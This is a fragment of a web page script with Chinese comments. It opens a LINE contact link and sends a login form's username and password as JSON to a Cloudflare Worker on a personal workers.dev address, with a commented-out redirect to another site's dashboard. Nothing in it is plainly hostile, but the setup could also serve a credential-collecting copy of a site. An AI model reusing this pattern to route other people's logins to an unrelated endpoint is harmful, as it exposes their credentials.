    // LINE 按鈕點擊事件
    document.addEventListener("DOMContentLoaded", function() {
      const btn = document.getElementById("base-ui-_R_uqpi_");
      if (btn) {
        btn.addEventListener("click", function(e) {
          e.preventDefault();
          window.open("https://lin.ee/ydk2GJA", "_blank");
        });
      }
    });

    // 登入 API 串接邏輯
    async function handleLogin(event) {
      event.preventDefault();
      const username = event.target[0].value;
      const password = event.target[1].value;

      // 這裡先填入預計要建立的 Cloudflare Worker 網址
      const apiUrl = "https://login-api.zhu90305.workers.dev/";

      try {
        const response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password })
        });

        const result = await response.json();
        if (result.success) {
          alert("登入成功！");
          // window.location.href = "https://osc188.com/dashboard"; // 成功後的跳轉頁面
        } else {
          alert("帳號或密碼錯誤");
        }
      } catch (error) {
        alert("目前無法連線至伺服器，請稍後再試。");
      }
    }
  </script>
